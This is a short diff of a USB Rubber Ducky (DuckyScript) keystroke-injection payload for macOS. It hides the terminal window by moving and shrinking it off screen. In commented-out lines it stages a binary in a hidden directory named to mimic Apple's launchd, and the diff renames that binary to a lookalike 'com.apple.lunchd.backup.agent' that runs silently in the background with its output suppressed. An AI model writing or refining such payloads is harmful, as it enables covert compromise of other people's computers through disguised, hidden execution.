@@ -20,13 +20,13 @@ STRING printf '\e[8;1;1t'; printf '\e[3;2560;1440t'
 ENTER
 
 REM === Create hidden directories ===
-REM STRING mkdir -p /private/var/tmp/com.apple.launchd && cp /Volumes/DUCKY/com.apple.iphone.backup /private/var/tmp/com.apple.launchd/ && cd /private/var/tmp/com.apple.launchd
+REM STRING mkdir -p /private/var/tmp/com.apple.launchd && cp /Volumes/DUCKY/com.apple.lunchd.backup.agent /private/var/tmp/com.apple.launchd/ && cd /private/var/tmp/com.apple.launchd
 REM DELAY 200
 REM ENTER
 
 REM === Execute the script silently in the background ===
 DELAY 800
-STRING cd /Volume/DUCKY && ./com.apple.iphone.backup > /dev/null 2>&1 &
+STRING ./com.apple.lunchd.backup.agent > /dev/null 2>&1 &
 DELAY 200
 ENTER
 
